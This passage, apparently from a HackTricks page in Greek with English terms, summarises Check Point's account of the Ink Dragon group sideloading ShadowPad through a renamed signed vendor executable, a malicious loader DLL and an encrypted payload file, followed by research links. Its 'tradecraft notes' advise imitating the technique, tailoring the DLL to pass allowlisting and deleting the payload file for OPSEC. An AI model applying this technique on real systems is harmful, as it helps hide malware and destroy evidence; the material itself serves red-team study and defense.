Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων** για να μιμηθεί νόμιμο λογισμικό ενώ διατηρεί το βασικό payload κρυπτογραφημένο στο δίσκο:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά η Authenticode signature παραμένει έγκυρη.
2. **Malicious loader DLL** – τοποθετείται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μόνος της ρόλος είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να κάνει reflectively map το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκευμένο ως `<name>.tmp` στον ίδιο κατάλογο. Μετά το memory-mapping του αποκρυπτογραφημένου payload, ο loader διαγράφει το TMP αρχείο για να καταστρέψει αποδεικτικά στοιχεία.

Tradecraft notes:

* Η μετονομασία του signed EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να παριστάνει ένα Windows binary αλλά να διατηρεί την vendor signature, οπότε αναπαράγετε τη συνήθεια του Ink Dragon να ρίχνει binaries που μοιάζουν με `conhost.exe` αλλά στην πραγματικότητα είναι utilities της AMD/NVIDIA.
* Επειδή το εκτελέσιμο παραμένει trusted, τα περισσότερα allowlisting controls απαιτούν μόνο η malicious DLL να βρίσκεται δίπλα του. Επικεντρωθείτε στην προσαρμογή του loader DLL· ο signed parent συνήθως μπορεί να τρέξει αμετάβλητος.
* Ο decryptor του ShadowPad περιμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι εγγράψιμο ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Διατηρήστε τον κατάλογο εγγράψιμο μέχρι να φορτωθεί το payload· μόλις στη μνήμη, το TMP αρχείο μπορεί να διαγραφεί με ασφάλεια για OPSEC.

## Αναφορές

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
